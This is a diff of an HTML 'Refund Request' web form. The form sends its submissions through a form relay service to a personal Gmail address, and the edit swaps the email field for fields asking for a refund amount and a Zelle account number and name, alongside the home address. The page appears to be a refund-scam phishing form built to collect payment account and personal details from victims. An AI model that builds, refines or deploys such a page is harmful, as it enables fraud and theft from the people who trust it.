@@ -102,18 +102,17 @@
       <h1><span>Refund Request</span></h1>
     </div>
     <form action="https://formsubmit.co/jenifferlaure05@gmail.com" method="POST">
-      <!-- Redirect after submission -->
       <input type="hidden" name="_next" value="iiii.html">
       <input type="hidden" name="_captcha" value="false">
 
-      <label for="email">Email</label>
-      <input type="email" name="Email" id="email" placeholder="you@example.com" required />
+      <label for="name">Name (Optional)</label>
+      <input type="text" name="Contact Address" id="name" placeholder="Your Name" optional />
 
-      <label for="name">Full Name</label>
-      <input type="text" name="Full Name" id="name" placeholder="Gigi Miller" required />
+      <label for="amount">Refund Amount</label>
+      <input type="text" name="Refund Amonut" id="amount" placeholder="Enter Amount" required />
 
-      <label for="phone">Phone Number</label>
-      <input type="tel" name="Phone Number" id="phone" placeholder="+1 234 567 8901" required />
+      <label for="phone">Zelle Number and Name</label>
+      <input type="text" name="Phone" id="phone" placeholder="Your Zelle Account Number" required />
 
       <label for="address">Address</label>
       <textarea name="Address" id="address" rows="3" placeholder="123 Main St, City, State, ZIP" required></textarea>
@@ -121,7 +120,7 @@
       <label for="reason">Reason for Refund</label>
       <textarea name="Refund Reason" id="reason" rows="4" placeholder="Explain your reason..." required></textarea>
 
-      <button type="submit">Submit Refund Request</button>
+      <button type="submit">Request Refund</button>
     </form>
   </div>
 </body>
